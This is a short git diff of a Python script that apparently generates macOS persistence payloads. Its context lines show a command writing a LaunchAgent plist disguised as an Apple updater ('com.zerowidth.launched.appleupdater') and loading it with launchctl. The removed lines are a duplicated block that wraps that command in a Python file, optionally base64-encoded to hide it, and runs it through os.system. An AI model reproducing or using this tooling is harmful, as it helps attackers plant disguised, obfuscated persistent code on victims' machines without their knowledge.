@@ -131,27 +131,7 @@ def main():
         </plist>
         
         " >> ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true;launchctl load -w ~/Library/LaunchAgents/com.zerowidth.launched.appleupdater.plist || true'''
-        
-    if encode in yes:
-        encoded = base64.b64encode(command)
-        
-        file = open(filename,"w")
-        file.write('import os\n')
-        file.write('import sys\n\n')
-        file.write('os.system("echo '+encoded+' | base64 -D")\n')
-        file.close()
     
-    elif encode in no:
-        file = open(filename,"w")
-        file.write('import os\n')
-        file.write('import sys\n\n')
-        file.write('os.system("""' + command + '""")')
-        file.close()
-    
-    else:
-        print(color['RED'] + "Error: Invalid choice." + color['WHITE'])
-        os._exit(1)
-        
     if encode in yes:
         encoded = base64.b64encode(command)
         
